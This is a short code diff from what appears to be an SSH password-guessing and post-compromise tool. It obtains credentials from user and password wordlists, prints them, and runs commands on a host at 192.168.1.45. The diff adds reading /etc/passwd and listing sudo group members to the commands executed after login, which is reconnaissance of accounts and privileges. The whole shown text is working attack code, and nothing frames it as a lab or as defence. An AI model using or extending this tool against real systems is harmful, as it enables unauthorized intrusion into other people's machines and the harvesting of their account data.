@@ -53,4 +53,6 @@ usr,pwd = getSshCredsAndConn(ulist="./init/userlist",plist="./init/passlist",dom
 print(f"Credentials user = {usr} | password={pwd}")
 autoSshPawn(usr,pwd,"192.168.1.45",['whoami',
                                     'pwd',
-                                    'ls -la'])
+                                    'ls -la',
+                                    'cat /etc/passwd',
+                                    'getent group sudo'])
